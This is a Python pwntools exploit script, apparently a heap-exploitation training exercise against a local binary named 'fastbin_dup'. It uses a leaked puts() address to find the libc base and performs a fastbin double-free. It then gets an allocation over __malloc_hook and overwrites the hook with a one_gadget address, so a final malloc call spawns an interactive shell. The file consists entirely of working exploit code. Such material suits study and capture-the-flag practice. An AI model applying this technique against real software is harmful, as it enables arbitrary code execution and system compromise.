#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
username = p64(0)+p64(0x31)
io.sendafter("username: ", username)
io.recvuntil("> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, "A"*0x68)
chunk_B = malloc(0x68, "B"*0x68)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

dup = malloc(0x68, p64(libc.sym.__malloc_hook-35))

# Program symbols are available via "elf.sym.<symbol name>".
chunk_A = malloc(0x68, "Y")
chunk_B = malloc(0x68, "Y")
chunk_A = malloc(0x68, b'Y'*19+p64(libc.address+0xe1fa1))

malloc(1,"")
# =============================================================================

io.interactive()
